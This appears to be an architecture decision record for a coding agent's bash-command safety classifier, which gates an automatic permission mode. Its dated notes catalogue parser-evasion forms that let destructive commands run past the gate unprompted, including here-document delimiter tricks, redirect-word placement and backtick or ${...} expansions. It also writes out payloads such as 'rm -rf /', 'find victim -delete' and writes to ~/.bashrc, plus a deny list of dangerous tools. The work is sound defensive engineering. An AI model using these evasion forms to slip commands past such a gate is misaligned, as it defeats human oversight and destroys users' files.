# ADR-0158 — Tree-sitter-bash AUTO-mode safety classifier

- **Status:** Accepted
- **Date:** 2026-06-21
- **Sprint:** WP-0 (TUI v2 overhaul roadmap)
- **Supersedes/relates:** ADR-0157 (the permission posture engine that adds the `auto` mode this
  classifier drives), ADR-0004 (`GuardrailExtension` — the regex first-block-wins floor retained as
  defense in depth). Roadmap: `.omc/specs/tui-v2-overhaul-roadmap.md` (overrides the earlier
  "auto mode = defer" note, which predated the install/soundness proof).
- **Extended by:** ADR-0237 (#204). This ADR answers with one grammar for one dialect; ADR-0237
  makes the RESOLVED shell an input, adds PowerShell and `cmd` classifiers beside this one, and
  keeps this classifier's DENY as a floor under them. Nothing here is retracted — the bash path
  is unchanged except that a known read-only name's ARGUMENTS are now read with the resolved
  dialect's switch syntax, which is what stopped `sort in.txt /o out.txt` from being an ALLOW
  under `cmd`.

## Context

The `auto` permission posture (ADR-0157) needs to decide, without a prompt, whether a shell command
is safe to run, must be blocked, or should fall back to asking. A regex approach (like the
`GuardrailExtension`) is brittle against quoting / subshell / concatenation evasions:
`echo "rm -rf /"` is harmless but a naive regex flags it; `r''m -rf /` is dangerous but a regex
misses it. An AST is structurally more sound.

## Decision

**Adopt tree-sitter-bash now.** Re-verified installable into the project venv
(`tree-sitter==0.25.2` + `tree-sitter-bash==0.25.1`; pins `tree-sitter>=0.25,<0.26`,
`tree-sitter-bash>=0.25,<0.26`) — prebuilt cross-platform wheels (linux/macos/windows), no compiler,
~3.4 MiB, `requires_python>=3.10` covers the project's `>=3.11`. Added to
`packages/aelix-coding-agent/pyproject.toml` `[project].dependencies` (core, not an extra — the gate
must run on every install path).

`builtin/bash_classifier.py` exposes a pure `classify(command) -> Verdict` over the
tree-sitter-bash AST (`Verdict.ALLOW < ASK < DENY`, so `max` picks the worst):

- **worst-of-pipeline traversal** — `command` / `pipeline` / `redirected_statement` / `list` /
  `program` / `subshell` / `compound_statement` / `command_substitution` / `process_substitution`
  bubble up the MAX verdict of their parts; control flow (`if`/`for`/`while`/`case`/function) → ASK.
- **command-name resolution** — `command_name` resolved to a literal: dynamic
  (`$(…)` / `$VAR`) → ASK; concatenation/quote-splice (`r''m`) resolved by stripping quotes;
  `/bin/rm` normalized via `rsplit("/")`; a leading `A=1` assignment is skipped.
- **rules** — DENY set `{rm,dd,mkfs,shred,fdisk,sudo,doas}`; `git` read-only subcommands → ALLOW
  else ASK; a READ_ONLY allowlist → ALLOW; pipe-into-shell at any non-first stage
  (`sh/bash/zsh/dash/ksh/fish`) → DENY; write-redirect to `/etc /dev /boot /sys /usr /bin ~/.ssh
  /root /.git` → DENY else ASK; unknown command → ASK.
  - **Dated note 2026-11-03 (#657, ADR-0288).** The ALLOW tier now READS the
    arguments of `git` and of the read-only names whose arguments can write or
    execute, so the git ALLOW set is narrowed and the leading-`A=1`-is-skipped
    line above is superseded: a `VAR=value` prefix now forces ASK on every
    command (DENY still wins). Every `git -c`/`--config-env` and
    `-C`/`--git-dir`/`--work-tree`/`GIT_DIR` asks (no safe-key list); `git
    config` asks unless it is a read form; `ls-remote`, `--output`/`--ext-diff`
    and branch/tag/remote/reflog mutations ask; `env <cmd>`, `rg --pre`, `uniq
    in out`, `tree -o`, `yq -i`, `file -C` ask. See `_classify_git`,
    `_classify_by_name` and `_classify_arg_sensitive_read_only` in
    `bash_classifier.py`. This is a NARROWING of the ALLOW allowlist, done with
    the full corpus re-run the "Open risks" note below requires.
    Review round 1 (2026-11-04) narrowed it again, with the Codex and verify
    corpora re-run: an assignment written as a statement or made inside an
    expansion asks; `find`/`fd` read static words (`-de\lete` is DENY) and
    `-fprint0` joins the DENY set; and the walk now visits a here-document
    body, a here-string and a redirect target, whose command substitutions run
    (`cat <<EOF` + `$(rm -rf ~)` read as ALLOW before). ADR-0288 has the
    details.
  - **Dated note 2026-11-04 (#677).** The write-redirect set above gained
    `&>>` (append stdout+stderr): it was missing, so `echo … &>> <protected>`
    was ALLOW while `>>` was DENY. `_WRITE_REDIRECT_OPS` / `_READ_REDIRECT_OPS`
    in `bash_classifier.py` now name the whole operator set tree-sitter-bash
    emits; a descriptor-closing `>&-` and a dup `2>&1` open no file.
  - **Dated note 2026-11-04 (#678).** The `/dev` entry in the protected-prefix
    list above refused EVERY write under `/dev`, including `2>/dev/null` and
    `>/dev/null`, which blocked common reads such as `rg foo 2>/dev/null`. A
    write redirect to exactly `/dev/null`, `/dev/stdout` or `/dev/stderr`
    (`_SINK_DEVICES`) is now ALLOW as a redirect — it changes no file — while
    any other `/dev` target stays DENY and the command's own verdict still
    applies (`rm -rf / >/dev/null` is DENY).
  - **Dated note 2026-11-09 (#710).** The #677 note's "a dup `2>&1` open no
    file" was not what the code did: `_redirect_verdict` read the number after
    `>&` as a target path, so `cat a 2>&1`, `git status 2>&1`,
    `ls >/dev/null 2>&1` and `cat a >&2` were ASK and the TUI asked under
    `auto`. The rules now, each pinned by `tests/builtin/test_bash_fd_dup_710.py`
    (shell behaviour measured on macOS bash 3.2, zsh 5.9, dash and ksh and on
    Linux bash 5.2, zsh 5.9, dash 0.5.12 and ksh 93u+m):
    - **A redirect's target is its FIRST word. A word written after it makes
      the command at least ASK, and the command is also judged with those
      words as its arguments, which can raise the verdict to DENY.**
      tree-sitter puts every word after a redirect inside its node —
      `find . 2>&1 -delete -maxdepth 1` is `file_redirect(2 >& 1 -delete
      -maxdepth 1)`, and `find . <<EOF -delete` keeps `-delete` in the
      `heredoc_redirect` — while bash and zsh pass those words to the
      command, and so do dash and ksh except after `&>` (below). `classify`
      also judges an argument view of the source (every redirect blanked
      except the words it passes on; a `$(…)` inside a blanked part kept,
      because it runs) and takes the worse verdict, so
      `find . 2>&1 -delete -maxdepth 1` is DENY like
      `find . -delete -maxdepth 1`. The view only raises: where the command
      with those words is ALLOW, the form still asks (`ls 2>&1 -la`,
      `rg foo 2>/dev/null -n src` and `echo x <&0 y` ask; `ls 2>&1 -la` asked
      before #710 too). tree-sitter's reading of such a line does not always
      match the shells', and a draft that let an ALLOW view lower the verdict
      ran `echo hi &>/dev/null find . -name 'keep*' -delete` (dash, ksh) and
      `test 1 -eq 0>&1 'a[$(touch PWNED)]'` (macOS ksh93) with no dialog in
      a pty TUI under `auto`. The view gets the walk and the #657
      expansion question alike: `test 2>&1 -v 'a[$(cmd)]'` asks like
      `test -v 'a[$(cmd)]'`; an earlier draft walked the view without asking
      that question, and the form, which runs `cmd` in Linux bash 5.2, ran with
      no dialog in a pty TUI under `auto` (with macOS ksh93 and `1 -eq`). The
      view follows bash where tree-sitter hangs a trailing redirect on a whole
      pipeline or list: in `ls | find . 2>&1 -delete` the words belong to
      `find`. A view that does not parse (`{ ls; } 2>&1 x`, which bash
      rejects) asks, and never lowers a DENY. This closes the same hole for a
      read (`find . </dev/null -delete`, `test </dev/null -v 'a[$(cmd)]'`), a
      read dup (`<&0`), a sink (`2>/dev/null … -path /dev/null`) and a close
      (`2>&- -delete`), all ALLOW before #710 — the `</dev/null` `find` deleted
      the files in its directory in a pty TUI under `auto` on `6caaae09`.
      Measured over 24,597 command strings (the classifier tests' at
      `24bcc679` and a hand list), with one of 29 redirects (dups, closes,
      sinks, reads and here-strings, `0>&1`, `0>/dev/null`, `&>/dev/null`,
      `>&-` and `3>&1` among them, and three here-documents) put before each
      argument and before the command name: of 1,808,498 forms none is ALLOW where the
      same command without the redirect asks or is refused, and none is ALLOW
      where `6caaae09` asked or refused it while a redirect holds a word after
      its target. 2,122 forms ask where the command without the redirect is
      refused: 2,115 because the grammar cannot parse the redirect form
      (`rm 2>&- -rf /`), 7 on a line all four shells reject
      (`0<&0 rm -rf /; { ls; } 2>&1 x`). 206 forms refused on `6caaae09` now
      ask: there the last word was read as the target (`tee 2>&1
      /etc/passwd`), while the shells pass it to the command, and the command
      with it asks (`tee /etc/passwd`). Reading the LAST word as the target
      instead (an earlier draft) let a trailing number make
      `find . 2>&1 -delete -maxdepth 1` an allowed dup.
    - **One digit written with no blank before `<` or `>` is the redirect's
      descriptor.** bash, zsh, dash and ksh take it so (`echo a 0>&1 x`
      prints `a x` in all four on macOS and on Linux), but tree-sitter makes
      a `0` there an argument of the command, or its name; the view blanks
      it with the redirect, so `0>&1 mkfs /dev/sda` is DENY (DENY on
      `6caaae09`, where the last word was read as the target, and ASK in an
      earlier draft). **A descriptor of two or more digits is a word the
      command may get:** bash takes `10>&1` as descriptor 10, while zsh,
      dash and ksh take one digit and pass `10` on (measured on both
      systems; `git branch 10>&1` created a branch `10` in them), so it makes
      the command at least ASK, as a word after a target does.
    - **Under the UNKNOWN and POSIX dialects the words after an `&>` or `&>>`
      target are also judged as a command of their own.** dash (macOS and
      Linux) and macOS ksh93u+ read `&>` as `&` and then `>`: the command
      before it runs in the background and the words after the target run as
      the next command (`echo hi &>/dev/null find . -name 'keep*' -delete`
      deleted the files in both; bash, zsh and Linux ksh 93u+m pass the words
      to `echo`). The argument view with that `&` kept is judged as well, so
      the form is DENY like `find . -delete`; in a pty TUI under `auto` it is
      refused with the files kept under `SHELL=/bin/dash` and `/bin/ksh`.
    - **A `>&` / `<&` target is a descriptor copy (ALLOW as a redirect) only
      when its source bytes, from the operator to the end of the shell word,
      are blanks and then ASCII digits.** The word ends at the end of input, a
      blank, one of `;&|()<>`, or the backtick that closes the `` `…` ``
      substitution the redirect is in; the same end decides a bare close and
      a sink below (`` echo `ls 2>&1` ``, `` echo `ls 2>&-` `` and
      `` echo `git rev-parse HEAD 2>/dev/null` `` write no file in any of the
      four shells, macOS and Linux). Any other backtick starts a substitution
      whose output joins the word — `` echo x >&1`echo .txt` `` writes `1.txt`
      in bash and zsh, `` 2>&-`echo 1` `` writes `-1` in zsh — so it asks.
      tree-sitter's `number` also covers `0x1`, `1#x` and `16#ff`, and
      tree-sitter skips `\r`, `\v` and `\f`
      between tokens; bash and zsh write each of those into a file name
      (`echo x >&1\r` creates `1\r`). After `>` or `&>` a number is a file
      name (`echo x >1`). Any other `<&` target is path-checked (ASK, or DENY on
      a protected path); every shell tried rejects that form, so this follows
      the contract rather than closing a live hole.
    - **A bare close (`2>&-`) stays ALLOW; a word glued to it asks** (`2>&-1`:
      zsh writes a file `-1`, bash passes `1` to the command). A sink device is
      ALLOW only with nothing glued to it: `>/dev/null\r` names a new file under
      `/dev` (DENY; created as root on Linux).
    - An operator outside the three sets is ASK.
    - **A here-document delimiter that is not one word asks, and the rest of
      its line is classified** (an adjacent hole, open since this ADR, closed
      with #710). tree-sitter's `heredoc_start` runs on past `;`, `>`, `|` and
      `&&` with no parse error when the end line is written the same way:
      `cat <<A; find . -name 'keep*' -delete` + `b` + `A;` is a start `A;`
      with `find …` as words, and `cat <<A>~/.bashrc` a start `A>~/.bashrc`.
      All four shells end the delimiter at that byte and run the rest of the
      line; the `find` deleted the files with no dialog in a pty TUI under
      `auto` on `6caaae09`. A start that is not plain bytes, quoted runs and
      backslash escapes is now at least ASK, and the rest of its first line is
      re-read after a `:`, so `find … -delete`, `| sh` and the `.bashrc` write
      are DENY; the body stays data. One-word delimiters (`<<EOF`, `<<'EOF'`,
      `<<"EOF"`, `<<-EOF`, `<<\EOF`, `<<'E O F'`) are unchanged. `$` and a
      backtick are not delimiter bytes here: `cat <<A$''` asks, because dash
      ends its body at a line `A$` and runs what follows (measured on macOS
      and Linux).

    Under `-p`, where an ASK runs without a prompt (ADR-0120), an ASK form
    still runs; the DENY forms above are refused there too.
  - **Dated note 2026-11-10 (#742).** **Outside a command or process
    substitution, a here-document body ends, for the verdict, on the line
    bash, zsh, dash and ksh end it on; where that is not the line tree-sitter
    ends it on, the command asks at least and what the shell runs is re-read
    so a DENY in it still counts. Inside a command or process substitution
    tree-sitter parses as one, any here-document asks at least. So does a
    `${…}` operand tree-sitter leaves as text when it holds a backtick,
    `$(`, `$[`, `${`, `<(` or `>(` no backslash escapes, and a backtick
    substitution holding a `'…'`, `$'…'` or comment with a backtick in it,
    or a word with an escaped backtick in it (fix rounds 2 and 3); other
    code tree-sitter leaves as text is not covered.** tree-sitter-bash
    0.25.1 compares body lines
    with the delimiter as written unless it starts with a quote or a backslash
    (`cat <<A''` ends at a line `A''`), and ends any body, `<<EOF` and
    `<<'EOF'` included, at a line holding the delimiter among blanks or before
    `;`, `#…` or `\r` (`EOF `, ` EOF`, `EOF;`). The shells end at the first
    line equal to the delimiter after quote removal, with leading tabs removed
    under `<<-`, and, only when no part of the delimiter is quoted or
    backslash-escaped, with a line ending in an odd number of backslashes
    joined to the next (measured with `<shell> -c` on macOS bash 3.2.57, zsh
    5.9, dash and ksh93u+ 2012-08-01 and in Linux docker bash 5.2.37, zsh 5.9,
    dash and ksh 93u+m/1.0.10, alike on both except for delimiters with bytes
    above ASCII; `.omc/probes/742/impl/`). `cat <<A''` + `x` + `A` +
    `find victim -delete` + `A''` and `cat <<EOF` + `EOF ` + `cat <<'Q'` +
    `EOF` + `find victim -delete` + `Q` were ALLOW on `b160b8f7` and deleted
    `victim` in all eight shells. `_heredoc_end_verdict` looks for each shell
    family's reading of the delimiter word (`$'…'` decoded by bash, zsh and
    ksh93 and kept with its `$` by dash; `$"…"` read as `A` by bash, `$A` by
    zsh and dash and `$"A"` by ksh93; a byte above ASCII or an escape inside
    `$'…'` is unknown and asks) line by line from the body's first line. A
    reading that ends elsewhere makes the verdict at least ASK, and three
    re-reads can raise it: the shell's body as the double-quoted string it
    expands like (unquoted delimiter only), the lines after the shell's end up
    to tree-sitter's end line (they parse inside `$(…)` too), and everything
    after the shell's end.

    **Fix round 1 (2026-11-10): rules that only raise.** The round-1 verify
    and a Codex review found forms the end-line model above misses, so each
    gap is now closed by a rule that can only make the verdict ASK or worse,
    at the cost of asking on some harmless commands:
    - *A here-document in a command or process substitution tree-sitter
      parses as one asks.* Inside
      backticks the eight shells end the substitution at its first unescaped
      backtick, inside a here-document body too, and remove `\⏎` before they
      read the here-document, quoted delimiter or not; macOS bash 3.2.57 does
      both with a `)` inside `$( )`, `<( )` and `>( )` (the verify's R1–R4,
      ALLOW on `61eda564`, each deleted `victim`; measured again on both
      systems, `.omc/probes/742/fix-r1/`). `_substituted_heredocs_verdict`
      makes any here-document inside such a substitution ASK at least, and
      re-reads, as far as the budget pays, the backtick text unescaped or the
      `$( )` text up to bash 3.2's `)` with `\⏎` joined, and, when the shells
      end the substitution early, the source with the substitution replaced
      by one word; so R1–R4 are refused, and inside double quotes, where what
      follows stays in the string, nothing is refused that no shell ran
      (`test_bash_heredoc_end_742.py`, the `_IN_SUBSTITUTION_*` rows). These
      re-reads are a best effort; the ASK is the rule. A backtick
      substitution with no quote in it inside `${…}` is plain text to
      tree-sitter, so this rule never sees a here-document there: the
      round-2 verify's ``echo ${x:-`cat <<EOF`` + `x` + `EOF` +
      `find victim -delete` + `` `} `` deleted `victim` in all nine shells of
      fix round 2 and was ALLOW on `ce3cc695`; fix round 2 covers it.
      `( … )`, `{ … }` and function bodies get no such rule: the shells
      parse them like the rest,
      ksh93's end of `( cat <<EOF` + `hi` + `EOF)` at `EOF)` is tree-sitter's
      too, and of the verify's 108,960 generated here-documents the ALLOW ones
      that deleted `victim` were all in a substitution.
    - *A re-read that stops parsing keeps the statements before.* Codex's
      `cat <<A''` + `x` + `A` + `find victim -delete` + `cat <<Z` + `A''`
      deleted `victim` in all eight shells and was ASK; `_reread_lines` now
      classifies the prefix ending before the first statement or line
      tree-sitter cannot parse (where that is the first one, it drops lines
      from the end until the rest parses), each prefix paid from the budget,
      and it is DENY. A statement before an error on its own line counts too,
      though bash runs no part of a line it cannot parse.
    - *Running out of stack asks where it happens.* A `RecursionError` in a
      re-read reached `classify`'s catch and replaced the DENY the walk had
      already found: the verify's 1,026-byte `cat <<A''` + `x` + `A` + `A''` +
      a 328-level `$(…)` nest and Codex's 103,172-byte `find victim -delete`
      + a 100 KB comment + 150 mismatched here-documents were DENY on
      `80ff2cc2` and ASK on `61eda564`. `_reread`, `_heredoc_end_verdict` and
      `_substituted_heredocs_verdict` now return ASK for that part only, and
      a re-read nested more than 24 deep is not made; both forms are DENY
      again, and prefixing the nest with that here-document no longer moves
      the depth at which it stops being refused (330 on macOS, Python 3.12).
    - *All the work is paid from one budget.* The re-reads, each reading's
      search for its end line and the delimiter word's scan are charged to a
      budget of four passes over the command plus 4 KiB per `classify` call
      (`_REREAD_BUDGET`); work it cannot pay is skipped and leaves the verdict
      at ASK, never lower. Unbounded re-reads grew exponentially (16
      mismatched here-documents parsed 6,632 times the input), and the
      end-line search was quadratic: Codex's `cat <<A''` + `x` + `B` + `ls` +
      `A''` repeated 1,600 times scanned 26.9 MB.

      | `cat <<A''` + `x` + `B` + `ls` + `A''` × N | 400 | 800 | 1,600 | 3,200 |
      |---|---|---|---|---|
      | `80ff2cc2` (ALLOW) | 5 ms | 10 ms | 19 ms | 45 ms |
      | `ac44df68` (ASK) | 42 ms | 161 ms | 605 ms | 2,365 ms |
      | now (ASK) | 10 ms | 11 ms | 20 ms | 41 ms |

      (one run each, macOS, Python 3.12). The ASK floor is the guarantee;
      which hidden line is still refused depends on sizes. An `rm -rf ~`
      hidden the same way after 22 documents like `cat <<A''` + `x` + `A` +
      `ls` + `A''` is refused and after 23 asks; padded with about 900 bytes
      in its own document it asks after 8, with about 4.5 KB after 4
      (measured on `ac44df68` and now). A test pins the four passes: a 5.4 KB
      command with one hidden `find` is refused with them and only asks
      without them.

    **Fix round 2 (2026-11-10): code tree-sitter leaves as text.** The
    round-2 verify found tree-sitter reading code as text in two places
    older than this issue, the same class as the here-documents above. Each
    is now ASK at least, and the text is re-read as the shells read it, so
    a DENY in it counts (`_hidden_code_verdict`, from `_judge`). Measured
    with `<shell> -c`, `x` unset and then `x=abc` in the environment, in
    macOS bash 3.2.57, zsh, dash and ksh93u+ and Linux docker bash 5.2.37,
    zsh, dash, ksh 93u+m and mksh (`.omc/probes/742/fix-r2/`):
    - *A `${…}` operand.* tree-sitter parses an operand that holds a
      backtick substitution with no quote in it as a plain `word`
      (``echo ${x:-`find victim -delete`}``), an operand after `#`, `%`,
      `/`, `^` or `,` as a `regex` whatever it holds
      (`echo ${x#$(find victim -delete)}`), and `'…'` or `$'…'` there as
      literal text, which inside double quotes or an expanded
      here-document body it is not (`echo "${x:-'$(find victim -delete)'}"`).
      Of a grid of 704 forms (22 operators × 8 operand spellings × bare, in
      double quotes, in a here-document body and inside `"$( )"`), 167 were
      ALLOW on `ce3cc695` and `80ff2cc2` and deleted `victim` in at least
      one shell. An operand holding a backtick, `$(`, `$[` or `${` no
      backslash escapes now asks, and is re-read as a double-quoted string
      when the `${…}` is in one or in a here-document body, else as a word.
      None of the 704 is ALLOW where a shell deleted `victim`: of the 438
      that did in some shell, 394 are refused and 44 ask.
    - *A quote or comment inside backticks that holds a backtick.* bash and
      ksh93 end a backtick substitution at the first unescaped backtick
      inside `'…'` and `$'…'` too, and every shell measured does so inside
      a comment; tree-sitter reads the string or comment across it.
      ``echo `echo '`; find victim -delete; echo `'` `` deleted `victim` in
      macOS bash 3.2.57 and ksh93u+ and Linux bash 5.2.37, and
      ``echo `echo hi # x`; find victim -delete; echo `y`` + `` ` `` in all
      nine; both were ALLOW on `ce3cc695`. Such a substitution now asks, and
      what the shells read is re-read as for a here-document in backticks,
      so both are refused.
    - *bash 3.2's `)` is looked for from the first here-document line*, not
      in the start word: `echo $(cat <<'E)'` + `x` + `)` +
      `find victim -delete` + `E)` + `)` deleted `victim` in macOS bash
      3.2.57 only and stays refused; a test now pins this (the round-2
      verify's mutant A19 had turned it into ASK unnoticed).

    **Fix round 3 (2026-11-10): the round-3 verify's measured rules.** The
    round-3 verify found two more forms of the class above, both ALLOW on
    `80ff2cc2` and on `3963bea9`, the round-2 tree
    (`.omc/probes/742/verify-r3/`, `test_bash_heredoc_end_742.py`, the
    fix-round-3 rows):
    - *A `<(…)` or `>(…)` in a `${…}` operand* is a plain word to
      tree-sitter. `echo ${x:-<(find victim -delete)}` deleted `victim` in
      macOS bash 3.2.57 and Linux bash 5.2.37, and so did `${x-…}`,
      `${HOME:+…}`, `${x:?…}`, `${x:->(…)}`, `cat ${x:-…}`, `${x:- <(…) }`
      and the nested `${x:-${y:-<(…)}}`; no other shell measured ran them,
      Alpine bash 5.3.20 included. `<(` and `>(` now count with the
      backtick, `$(`, `$[` and `${`, so these are refused.
    - *A word holding an escaped backtick inside backticks*, which the
      shells unescape into a nested substitution:
      ``echo `echo \`find victim -delete\`` `` deleted `victim` in all nine
      shells and in bash 5.3.20, and so did the `cat`, `ls`, pipe,
      double-nested and ``\${x:-\`…\`}`` variants. Such a substitution
      now asks and is re-read as for a quote holding a backtick, with the
      escaped backtick unescaped, so these are refused.
    - *The walk's cost.* Whether a `${…}` sits in double quotes was found by
      climbing `.parent`, which py-tree-sitter answers by walking down from
      the root, so nested operands cost cubic time with no hidden code in
      them: `echo ${x:-` nested 490 deep took 947 ms on `3963bea9` against
      2 ms on `80ff2cc2`, and eight such chains in one 23.6 KB line 7.6 s
      against 19 ms. The flag is now carried down the walk: 3 ms and 27 ms,
      with the same verdicts (best of three, one run on `3963bea9`, macOS,
      Python 3.12; `.omc/probes/742/finish/`).

    **Accepted cost** — ASK where no shell measured ran anything: a malformed
    end line with a trailing blank or a stray `\r` at the end of the command
    (`cat <<EOF` + `x` + `EOF `), which the shells never end; and any
    here-document inside a command or process substitution tree-sitter
    parses as one, for example
    ``echo `cat <<'EOF'`` + `hi` + ``EOF` `` (all eight shells print `hi`),
    `echo $(cat <<EOF` + `hi` + `EOF` + `)` and `cat <(cat <<EOF` + `hi` +
    `EOF` + `)`, ALLOW on `80ff2cc2`. Some odd delimiters inside a
    substitution are refused where they only asked: of 229 sampled forms that
    went from ASK to DENY, 215 deleted `victim` in a macOS shell and 14 (with
    backslashes in the delimiter, like `<<"EOF\\"`) did not. Fix round 2
    adds, ASK where no shell measured ran anything: any backtick
    substitution in a `${…}` operand that holds no quote
    (``echo ${x:-`pwd`}``, ``echo "${VERSION:-`cat VERSION`}"``), a `${`
    or `$[` tree-sitter left as text (`echo ${path#${HOME}/}`,
    `echo ${x:-$[1+2]}`), and a `'…'` holding `$(` or a backtick in an
    operand outside double quotes, where it quotes
    (`[ 1 = ${x:-'a[$(touch PWNED)]'} ]`); and DENY where no shell measured
    ran it: `'…'` or `$'…'` holding the substitution in a pattern operand
    (after `#`, `%`, `/`, `^` or `,`) inside double quotes or a here-document
    body, where the shells still read the quotes
    (`echo "${x#'$(find victim -delete)'}"`; 48 of the 704 grid forms).
    Fix round 3 adds, ASK where no shell measured ran anything: a nested
    escaped backtick such as ``echo `basename \`pwd\`` `` (the one line of
    the 31,348 corpus, test and realistic strings and the round-3 verify's
    199 lines whose verdict it changes) or ``echo `echo \`date\`` ``, and a
    harmless `<(…)` in an operand (`echo ${x:-<(echo hi)}`).

    **Measured only raising.** Against `b160b8f7` at `ac44df68`: the #710
    sweep (24,668 argv strings from the tests at `b160b8f7` and the hand
    list, 29 redirects before each argument and the name, 1,815,255 forms)
    has no form below `b160b8f7` and none above; of 30,446 command strings
    one changed, `cat <<A$''` + `x` + `A$` + `find victim -delete` (ASK →
    DENY; dash deletes), which also makes the #710 note's "`cat <<A$''`
    asks" DENY when its hidden line is refused; 115 hand and test
    here-documents are otherwise unchanged. In a fuzz of 5,860 random
    here-documents with these end lines none went below `b160b8f7`; of the
    423 that were ALLOW, the 11 where a shell ran a hidden `touch PWNED` now
    ask, the 60 still ALLOW ran it in none of the eight shells, and 352 now
    ask with no effect: 341 the shells never end (they print the rest as the
    body), 10 they end earlier and then run an unknown command, 1 they end
    later. Fix round 1, against `80ff2cc2` (the same classifier): the
    verify's 108,960 generated here-documents (12 wrappers, 31 delimiters,
    both operators) have none below `80ff2cc2`, `ac44df68` or `61eda564`;
    the 4,640 still ALLOW are a subset of the 7,424 the verify ran in the
    eight shells, and none deleted `victim`. The #710 sweep re-run (24,972
    argv strings, 1,909,470 forms, redirects also before and after every
    `[`/`[[`) has none below `80ff2cc2` and no exception caught by
    `classify`; the 30,841 corpus strings and 132 realistic lines, under
    UNKNOWN and POSIX, have none below and none changed from `61eda564`.
    Fix round 2, measured on the #742 commit alone (`d5711a6d` plus this
    round, without #743) against `80ff2cc2` and `d5711a6d`: the #710 sweep
    (25,255 argv strings, 1,928,940 forms) has none below either and no
    exception caught by `classify`; the round-1 verify's 108,960
    here-documents keep every verdict; the round-2 verify's 936-form
    substitution set has none below, 3 harmless ``echo ${x:-`cat <<EOF`` +
    `hi` + `EOF` + `` `} `` forms go from ALLOW to ASK and 3 from ASK to DENY;
    the round-1 verify's 7,560-form `[`/`[[`/`test` grid has none below and 42
    go from ALLOW to ASK, all `${x:-'a[$(touch PWNED)]'}` forms that ran
    nothing in the eight shells; of 31,348 corpus, test and realistic strings
    under UNKNOWN and POSIX the three realistic ``${…:-`…`}`` lines changed
    (ALLOW → ASK) and nothing else. Live, in a pty TUI under `auto` with a
    scripted model, on `ce3cc695` with no dialog and both files deleted, now
    refused with both kept: ``echo ${x:-`rm -f keep1.txt keep2.txt`}`` with
    `SHELL=/bin/zsh` and `/bin/bash`; ``echo `echo '`; find . -name 'keep*'
    -delete; echo `'` `` and the comment form with `rm -f keep1.txt keep2.txt`
    with `/bin/bash`; `echo ${x#$(rm -f keep1.txt keep2.txt)}` and `echo
    "${x:-'$(rm -f keep1.txt keep2.txt)'}"` with `/bin/zsh`. ``echo
    ${HOME:-/tmp} `date '+%F'` `` runs with no dialog on both.
    Fix round 3, on the #742 commit alone (`15b9f044` plus this round)
    against `80ff2cc2` and `15b9f044`, and on `3963bea9` plus this round
    against `3963bea9`: the #710 sweep (25,292 argv strings, 1,930,980
    forms), the 108,960 here-documents, the 7,560-form grid, the 936-form
    substitution set and the 704-form `${…}` grid keep every verdict, with
    no exception caught by `classify`; of the 31,348 corpus, test and
    realistic strings and the round-3 verify's 199 lines, under UNKNOWN and
    POSIX, only ``echo `basename \`pwd\`` `` changed (ALLOW → ASK). Live,
    in a pty TUI under `auto` with a scripted model on `3963bea9` plus this
    round, `echo ${x:-<(rm -f keep1.txt keep2.txt)}` with `SHELL=/bin/bash`
    and ``echo `echo \`rm -f keep1.txt keep2.txt\`` `` with `/bin/bash` and
    `/bin/zsh`, which ran with no dialog and deleted both files on
    `3963bea9` and `80ff2cc2` in the verify's run, are refused with both
    files kept.
    Live, in a pty TUI under `auto` with a scripted model: with
    `SHELL=/bin/zsh` the `A''` form and the `EOF ` form deleted the files with
    no dialog on `b160b8f7` and are refused with the files kept now; R1
    (``echo `cat <<'EOF'`` + `x` + `EO\` + `F` + `find . -name 'keep*'
    -delete` + `EOF` + `` ` ``) with `/bin/zsh` and R2 (the body's own backtick)
    with `/bin/bash` deleted the files with no dialog on `61eda564` and are
    refused with the files kept now; `cat <<'EOF'` + `find . -name 'keep*'
    -delete` + `EOF` runs with no dialog on all three.

    **Dated note 2026-11-12 (#768): backtick text as the shells read it.**
    The rules above re-read backtick text only when a quote or comment in it
    holds a backtick or a word holds `` \` ``. Before the shells parse
    backtick text again, they turn `\\` into `\`, `\$` into `$` and `` \` ``
    into a backtick and remove `\⏎`, and they end the substitution at its
    first unescaped backtick. Measured with `<shell> -c` in a scratch
    directory holding `files/z[$(: > MARK)]`, in macOS bash 3.2.57, zsh 5.9,
    dash and ksh93u+ and Linux docker bash 5.2.37, zsh 5.9, dash 0.5.12,
    ksh 93u+m and mksh 59c (`.omc/probes/768/impl/`), each ALLOW on
    `363accf2`: ``echo `echo "${x:-'\$(: > MARK)'}"` `` created `MARK` in all
    nine, its `$\\⏎(` spelling in macOS dash and ksh93u+ and Linux dash and
    mksh, and ``echo `echo x` `touch MARK` ``, which tree-sitter-bash 0.25.1
    reads as one substitution, in all nine; ``printf '[%s]\n' `printf %s
    '-de\⏎lete'` `` printed `[-delete]` in all nine, and
    ``echo `find . '-de\⏎lete'` `` was ALLOW. The second form (two
    substitutions a blank apart) needs no escape; closing it with this
    reading was the lane's call, not the owner's.

    Now a backtick substitution whose text the shells read otherwise is
    re-read as they read it (`_backtick_unescaped_verdict`): the text up to
    the first unescaped backtick with those escapes undone, and, in a
    double-quoted string or an expanded here-document body, also with `\"`
    undone (in `"…"` all nine undid it; in a here-document body dash and
    ksh93 did and bash, zsh and mksh did not); where the shells end the
    substitution early, the source with it replaced by one word as well. Each
    reading is classified as a whole command (`_reread_command`): its own
    verdict when tree-sitter parses it, as low as ALLOW, else ASK at least
    and DENY when its joined reading or a prefix is. A `$` from `\$` that a
    backslash and another byte follow keeps its backslash in the read text,
    because tree-sitter rejects `$\` there and no shell starts an expansion
    at it (`printf '[%s]\n' $\(x\)` printed `[$(x)]` in all nine). A command
    or re-read text tree-sitter rejects still has the backtick substitutions
    it found read this way (`_rejected_command_verdict`, and in
    `_reread_lines` and `_reread_as_expanded`): ``echo `echo \$(rm -rf ~)` ``,
    which asked before any reading on `363accf2`, is DENY. The #762 joined
    reading gains one that also joins `\⏎` inside backticks and inside a
    `$(…)` in an expanded here-document body (`_substitution_joined_verdict`;
    `cat <<E⏎[$(printf %s 'a\⏎b')]⏎E` printed `[ab]` in seven of the nine;
    dash, on macOS and Linux, printed `[a\⏎b]`), and the higher of the two
    holds; inside `"$(…)"` all nine kept it in a `'…'`, so it stays kept
    there. Every reading #768 adds
    is paid from its own budget (`_BACKTICK_BUDGET`, as large as
    `_REREAD_BUDGET`), so the #742 and #762 re-reads spend what they spent on
    `363accf2` and find what they found there.

    Tests: `tests/builtin/test_bash_backtick_unescape_768.py`; on `363accf2`
    167 of its first round's cases failed (a verdict below the one pinned, a
    helper that does not exist, or a gate that does not ask) and 57 passed:
    the kept verdicts, the shell premises, and three that hold there too (a
    budget guard, a time bound and a spy that no backtick without a backslash
    is re-read; the round-1 verify). The 18 grid rows
